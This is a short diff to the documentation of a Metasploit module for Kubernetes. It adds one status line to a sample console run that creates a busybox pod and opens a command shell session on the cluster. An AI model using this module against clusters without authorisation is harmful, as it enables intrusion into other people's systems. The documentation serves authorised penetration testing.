+++ documentation/modules/exploit/multi/kubernetes/exec.md
@@ -104,6 +104,7 @@ msf6 exploit(multi/kubernetes/exec) > run RHOST="" RPORT="" POD="" SESSION=-1
 [*] Using image: busybox
 [+] Pod created: burhgvzc
 [*] Waiting for the pod to be ready...
+[+] Successfully established the WebSocket
 [*] Found shell.
 [*] Command shell session 2 opened (172.17.0.31:59437 -> 10.96.0.1:443) at 2021-10-01 10:05:57 -0400
